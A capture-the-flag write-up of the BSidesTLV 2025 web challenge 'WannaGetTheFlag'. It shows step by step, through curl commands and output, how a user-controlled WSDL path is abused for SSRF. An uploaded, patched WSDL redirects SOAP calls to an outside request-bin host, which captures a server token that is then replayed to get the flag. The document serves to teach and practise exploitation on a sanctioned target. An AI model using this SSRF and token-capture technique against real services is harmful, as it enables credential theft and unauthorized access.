# WannaGetTheFlag

 * Category: Web
 * Solved by the JCTF Team

## Description

> You have just one option: don’t get the flag. Give up now and try another challenge.
> 
> But… if you’re one of those people for whom "no" is never an acceptable answer — you might just find a way to claim the flag.

## Solution

We arrive to a webpage with the following content:

```
Do you want a flag?

[No, thanks]

To move on, please upload a signed form saying you do not want the flag. Just one more silly step — better safe than sorry!
[Click here to upload your waiver (max 3KB)]
```

<details>

<summary>Click to view sources</summary>

```html
<body>
    <div class="container">
        <h1 class="glitch">Do you want a flag?</h1>
        
        <div>
            <button class="btn" onclick="dontWantFlag()">No, thanks</button>
        </div>        <div style="margin-top: 2rem;">
            <p>To move on, please upload a signed form saying you do not want the flag. Just one more silly step — better safe than sorry!</p>
            <label class="file-label">
                <input type="file" class="file-input" id="waiverFile" accept=".txt,.pdf,.doc,.docx">
                <span>Click here to upload your waiver (max 3KB)</span>
            </label>
        </div>

        <div id="uploaded-doc" style="margin-top: 1rem; display: none;">
            <p>Your document is available at: <a id="doc-link" href="#" target="_blank" style="color: #00ff00;"></a></p>
        </div>

        <div id="error-msg"></div>
        <div id="success-msg"></div>
    </div>    <script>
        let SOAP_SERVER;
        let APP3_BASE_URL;
        appPath = 'https://bstlv25-wanna-get-the-flag-soap.chals.io/';
        storagePath = 'https://bstlv25-wanna-get-the-flag-document.chals.io/';
        // Fetch configuration when the page loads
        async function fetchConfig() {
            try {
                const response = await fetch('api/config');
                if (!response.ok) throw new Error('Failed to fetch config');
                const config = await response.json();
                // Remove protocol and hostname since we're using proxy paths
                APP3_BASE_URL = `/${config[storagePath]}`;
                SOAP_SERVER = `/${config[appPath]}`;
            } catch (error) {
                console.error('Failed to fetch config:', error);
                showError("Failed to initialize application");
            }
        }

        // Call fetchConfig when the page loads
        fetchConfig();

        async function dontWantFlag() {
            try {
                const wsdlUrl = SOAP_SERVER;
                const response = await fetch(`api/dontWantFlag?wsdl_path=${encodeURIComponent(appPath)}`);
                
                if (!response.ok) {
                    const error = await response.json();
                    throw new Error(error.error || 'Failed to process request');
                }

                const result = await response.json();
                showSuccess(result.result);
            } catch (error) {
                showError("Something went wrong: " + error.message);
            }
        }

        document.getElementById('waiverFile').addEventListener('change', async function(e) {
            const file = e.target.files[0];
            if (!file) return;

            if (file.size > 3072) { // 3KB limit
                showError("File too large! Maximum size is 3KB");
                this.value = '';
                return;
            }            try {                
                const base64Content = await convertFileToBase64(file);
                const response = await fetch(`${APP3_BASE_URL}/setDoc`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain'
                    },
                    body: base64Content
                });

                if (!response.ok) throw new Error('Failed to upload waiver');

                const result = await response.json();
                // Use relative paths for the proxy
                const docUrl = `${APP3_BASE_URL}/getDoc/` + result.key;
                document.getElementById('doc-link').href = docUrl;
                document.getElementById('doc-link').textContent = docUrl;
                document.getElementById('uploaded-doc').style.display = 'block';
                showSuccess("Waiver uploaded successfully!");
            } catch (error) {
                showError("Failed to upload waiver: " + error.message);
            }
        });

        function convertFileToBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = () => resolve(reader.result);
                reader.onerror = error => reject(error);
            });
        }

        function showError(message) {
            const errorDiv = document.getElementById('error-msg');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            setTimeout(() => { errorDiv.style.display = 'none'; }, 5000);
        }

        function showSuccess(message) {
            const successDiv = document.getElementById('success-msg');
            successDiv.textContent = message;
            successDiv.style.display = 'block';
            setTimeout(() => { successDiv.style.display = 'none'; }, 5000);
        }
    </script>
</body>
</html>
```

</details>

This page presents a "refuse the flag" flow. On load, it fetches backend routing information from `/api/config` and dynamically sets proxy paths to a SOAP service and a document storage service. The "No, thanks" button triggers a SOAP request via `/api/dontWantFlag`, passing a user-controlled `wsdl_path` parameter.
The file upload logic base64-encodes any small document and uploads it to a storage backend via `/setDoc`, then exposes a public `/getDoc/<key>` URL. 

We notice two things here:

 1. The `wsdl_path` parameter passed from the client to the server is likely intended to tell the backend where to load the SOAP service definition (WSDL) from. Since it is fully controlled by the user and simply URL-encoded, it becomes a classic SSRF vector: Instead of pointing to the intended SOAP server, we might be able to supply an different path, causing the backend to fetch and interact with unintended targets.
 2. We are able to upload small documents, and if we can point the WSDL path to the document we've uploaded, we'll can control the SOAP service definition that the backend loads. This means we can define arbitrary SOAP actions and endpoints, effectively turning the target into a blind HTTP client that follows our instructions.


When we click the button, the application makes a request to `https://bstlv25-wanna-get-the-flag-proxy.chals.io/app/api/dontWantFlag?wsdl_path=https%3A%2F%2Fbstlv25-wanna-get-the-flag-soap.chals.io%2F`.

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ curl "https://bstlv25-wanna-get-the-flag-proxy.chals.io/app/api/dontWantFlag?wsdl_path=https%3A%2F%2Fbstlv25-wanna-get-the-flag-soap.chals.io%2F"
{"result":"No flag for you! Hope you enjoyed the challenge."}
```

The WSDL definition can be found by visiting `https://bstlv25-wanna-get-the-flag-soap.chals.io/?wsdl`:

<details>

<summary>Click to expand...</summary>

```xml
<wsdl:definitions targetNamespace="https://bstlv25-wanna-get-the-flag-soap.chals.io/" name="Application">
	<wsdl:types>
		<xs:schema targetNamespace="https://bstlv25-wanna-get-the-flag-soap.chals.io/" elementFormDefault="qualified">
			<xs:complexType name="do_you_want_a_flag">
				<xs:sequence>
					<xs:element name="token" type="xs:string" minOccurs="0" nillable="true"/>
					<xs:element name="want_flag" type="xs:boolean" minOccurs="0" nillable="true"/>
				</xs:sequence>
			</xs:complexType>
			<xs:complexType name="do_you_want_a_flagResponse">
				<xs:sequence>
					<xs:element name="do_you_want_a_flagResult" type="xs:string" minOccurs="0" nillable="true"/>
				</xs:sequence>
			</xs:complexType>
			<xs:element name="do_you_want_a_flag" type="tns:do_you_want_a_flag"/>
			<xs:element name="do_you_want_a_flagResponse" type="tns:do_you_want_a_flagResponse"/>
		</xs:schema>
	</wsdl:types>
	<wsdl:message name="do_you_want_a_flag">
		<wsdl:part name="do_you_want_a_flag" element="tns:do_you_want_a_flag"/>
	</wsdl:message>
	<wsdl:message name="do_you_want_a_flagResponse"></wsdl:message>
	<wsdl:service name="FlagsService">
		<wsdl:port name="Application" binding="tns:Application">
			<wsdlsoap11:address location="http://bstlv25-wanna-get-the-flag-soap.chals.io/"/>
		</wsdl:port>
	</wsdl:service>
	<wsdl:portType name="Application">
		<wsdl:operation name="do_you_want_a_flag" parameterOrder="do_you_want_a_flag">
			<wsdl:input name="do_you_want_a_flag" message="tns:do_you_want_a_flag"/>
			<wsdl:output name="do_you_want_a_flagResponse" message="tns:do_you_want_a_flagResponse"/>
		</wsdl:operation>
	</wsdl:portType>
	<wsdl:binding name="Application" type="tns:Application">
		<wsdlsoap11:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
		<wsdl:operation name="do_you_want_a_flag">
			<wsdlsoap11:operation soapAction="do_you_want_a_flag" style="document"/>
			<wsdl:input name="do_you_want_a_flag">
				<wsdlsoap11:body use="literal"/>
			</wsdl:input>
			<wsdl:output name="do_you_want_a_flagResponse">
				<wsdlsoap11:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
	</wsdl:binding>
</wsdl:definitions>
```

</details>

This WSDL defines a SOAP 1.1 service with a single method `do_you_want_a_flag` that accepts a user-controlled token and a boolean `want_flag`.  
Technically we can call it, but we don't have a token to provide it with. We'll need to work a bit to get one.

The service address is defined by:

```console
	<wsdl:service name="FlagsService">
		<wsdl:port name="Application" binding="tns:Application">
			<wsdlsoap11:address location="http://bstlv25-wanna-get-the-flag-soap.chals.io/"/>
		</wsdl:port>
	</wsdl:service>
```

This location field tells SOAP clients where to send requests to. If we were to modify
this field content, we could redirect all SOAP requests to a location of our choice.  

We'll save the original WSDL, modify the `location` 
field to a *request bin* server, and upload it somewhere. Then, we'll try to point
the server to it so that it reads the WSDL scheme from our file.

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ wget "https://bstlv25-wanna-get-the-flag-soap.chals.io/?wsdl" -q -O original_wsdl.xml

┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ sed 's|http://bstlv25-wanna-get-the-flag-soap.chals.io/|https://jctf1.free.beeceptor.com|g' original_wsdl.xml > wsdl_patched.xml
```

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ curl "https://bstlv25-wanna-get-the-flag-proxy.chals.io/app/api/dontWantFlag?wsdl_path=https%3A%2F%2Fpastebin%2Ecom%2Fraw%2FA5Hk4HjJ"
{"error":"Invalid WSDL path"}
```

It looks like the server won't accept just any URL though. Smart.  
This is where the waiver upload service comes in.  
We just upload it to the server, right?

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ curl -X POST \
  https://bstlv25-wanna-get-the-flag-proxy.chals.io/storage/setDoc \
  -H "Content-Type: text/plain" \
  --data-binary @wsdl_patched.xml

{"key":"792a9e7e-21c7-493e-a7e8-8bfd49b44595"}
```

Note that the client side base64-encodes the payload before sending it to the server, but we don't
have to if we use our own client-side logic.

Now we try to access it:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ curl "https://bstlv25-wanna-get-the-flag-proxy.chals.io/app/api/dontWantFlag?wsdl_path=https://bstlv25-wanna-get-the-flag-proxy.chals.io/storage/getDoc/792a9e7e-21c7-493e-a7e8-8bfd49b44595"
{"error":"Invalid WSDL path"}
```

Still not working though, there must be some extra validation on the address.  
If we go back to the source code, we can see that the first thing the application does is
call `api/config` for some proxy-related addressing.

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ curl "https://bstlv25-wanna-get-the-flag-proxy.chals.io/app/api/config"
{"https://bstlv25-wanna-get-the-flag-document.chals.io/":"storage","https://bstlv25-wanna-get-the-flag-soap.chals.io/":"server"}
```

This might be the bypass we need - instead of accessing `https://bstlv25-wanna-get-the-flag-proxy.chals.io/storage/getDoc/792a9e7e-21c7-493e-a7e8-8bfd49b44595`, we'll use the equivalent address of `https://bstlv25-wanna-get-the-flag-document.chals.io/getDoc/792a9e7e-21c7-493e-a7e8-8bfd49b44595`. 

Let's try:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ curl "https://bstlv25-wanna-get-the-flag-proxy.chals.io/app/api/dontWantFlag?wsdl_path=https://bstlv25-wanna-get-the-flag-document.chals.io/getDoc/792a9e7e-21c7-493e-a7e8-8bfd49b44595"
```

This time we get a hit on the request bin! The content is:

```xml
<?xml version='1.0' encoding='utf-8'?>
<soap-env:Envelope xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/"><soap-env:Body><ns0:do_you_want_a_flag xmlns:ns0="https://bstlv25-wanna-get-the-flag-soap.chals.io/"><ns0:token>MTAuMS4wLjIwOjE2YjlmYmI5ZDExOWRhNTUyMDFjODcyMDU0MDlkZTNhNjBlNTgwODBiNTA1Y2YxMTUyMGI3NTNkYzBiMTFlODA=</ns0:token><ns0:want_flag>false</ns0:want_flag></ns0:do_you_want_a_flag></soap-env:Body></soap-env:Envelope>
```

We finally have a token! We change the `want_flag` node value from `false` to `true` and call the API to get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/WannaGetTheFlag]
└─$ curl --request POST \
  --url 'https://bstlv25-wanna-get-the-flag-soap.chals.io/' \
  --header 'content-type: text/xml; charset=utf-8' \
  --header 'soapaction: "do_you_want_a_flag"' \
  --data-raw '<?xml version='\''1.0'\'' encoding='\''utf-8'\''?><soap-env:Envelope xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/"><soap-env:Body><ns0:do_you_want_a_flag xmlns:ns0="https://bstlv25-wanna-get-the-flag-soap.chals.io/"><ns0:token>MTAuMS4wLjIwOjE2YjlmYmI5ZDExOWRhNTUyMDFjODcyMDU0MDlkZTNhNjBlNTgwODBiNTA1Y2YxMTUyMGI3NTNkYzBiMTFlODA=</ns0:token><ns0:want_flag>true</ns0:want_flag></ns0:do_you_want_a_flag></soap-env:Body></soap-env:Envelope>'
<?xml version='1.0' encoding='UTF-8'?>
<soap11env:Envelope xmlns:soap11env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="https://bstlv25-wanna-get-the-flag-soap.chals.io/"><soap11env:Body><tns:do_you_want_a_flagResponse><tns:do_you_want_a_flagResult>Congratulations! Here is your flag: b'BSidesTLV2025{83tt3R_54f3_th4n_51llY}'</tns:do_you_want_a_flagResult></tns:do_you_want_a_flagResponse></soap11env:Body></soap11env:Envelope>   
```